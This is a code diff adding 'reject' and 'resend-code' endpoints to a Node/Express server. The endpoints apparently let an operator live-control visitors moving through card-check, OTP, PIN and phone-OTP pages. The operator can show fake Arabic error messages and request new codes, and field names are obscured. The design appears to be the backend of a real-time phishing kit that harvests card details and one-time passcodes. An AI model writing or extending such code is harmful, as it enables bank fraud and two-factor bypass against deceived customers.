@@ -1167,6 +1167,111 @@ async function startServer() {
     }
   });
 
+  // Reject Action - Admin rejects with error message (keeps customer on same page)
+  app.post("/api/dashboard/reject", async (req, res) => {
+    try {
+      const { visitorId, targetPage, errorMessage } = req.body;
+      if (!visitorId || !targetPage) {
+        res.status(400).json({ error: "Missing visitorId or targetPage" });
+        return;
+      }
+
+      console.log("[Dashboard Reject] visitorId:", visitorId, "targetPage:", targetPage, "errorMessage:", errorMessage);
+      
+      const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+
+      // Update statuses based on target page
+      const updateData: Record<string, any> = {
+        rejectionAt: new Date().toISOString(),
+        rejectionMessage: errorMessage || "حدث خطأ",
+        currentPage: targetPage,
+      };
+
+      // Set status based on page
+      if (targetPage === "check") {
+        updateData._v1Status = "rejected";
+        updateData.cardRejectionMessage = errorMessage;
+        updateData.cardRejectionAt = new Date().toISOString();
+      } else if (targetPage === "step2") {
+        updateData._v5Status = "rejected";
+        updateData.otpRejectionMessage = errorMessage;
+        updateData.otpRejectionAt = new Date().toISOString();
+      } else if (targetPage === "step3") {
+        updateData._v6Status = "rejected";
+        updateData.pinRejectionMessage = errorMessage;
+        updateData.pinRejectionAt = new Date().toISOString();
+      } else if (targetPage === "step5") {
+        updateData.phoneOtpStatus = "rejected";
+        updateData.phoneRejectionMessage = errorMessage;
+        updateData.phoneRejectionAt = new Date().toISOString();
+      }
+
+      await upsertVisitor(visitorId, updateData);
+
+      // Preserve all existing visitor data for dashboard
+      const dashboardData = await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...currentVisitor,
+        ...updateData, 
+        updated: `تم الرفض: ${errorMessage}` 
+      });
+
+      broadcastToDashboard("dashboard:update", dashboardData);
+
+      res.json({ success: true, rejected: true, targetPage });
+    } catch (error) {
+      console.error("reject error", error);
+      res.status(500).json({ error: "Failed to reject customer" });
+    }
+  });
+
+  // Resend Code - Admin resends OTP code to customer
+  app.post("/api/dashboard/resend-code", async (req, res) => {
+    try {
+      const { visitorId, targetPage, errorMessage } = req.body;
+      if (!visitorId) {
+        res.status(400).json({ error: "Missing visitorId" });
+        return;
+      }
+
+      console.log("[Dashboard Resend] visitorId:", visitorId, "targetPage:", targetPage, "errorMessage:", errorMessage);
+      
+      const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+
+      const updateData: Record<string, any> = {
+        resendRequestedAt: new Date().toISOString(),
+        resendErrorMessage: errorMessage || "رمز التحقق غير صحيح او منتهي الصلاحية يرجى انتظار رمز جديد",
+        currentPage: targetPage || "step5",
+        // Clear previous OTP
+        phoneOtpStatus: null,
+        _v7: null,
+      };
+
+      await upsertVisitor(visitorId, updateData);
+
+      // Preserve all existing visitor data for dashboard
+      const dashboardData = await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...currentVisitor,
+        ...updateData, 
+        updated: "تم إعادة إرسال الرمز" 
+      });
+
+      broadcastToDashboard("dashboard:update", dashboardData);
+
+      res.json({ success: true, resend: true });
+    } catch (error) {
+      console.error("resend code error", error);
+      res.status(500).json({ error: "Failed to resend code" });
+    }
+  });
+
   // Manual Redirect - Admin redirects customer to any page
   app.post("/api/dashboard/redirect", async (req, res) => {
     try {
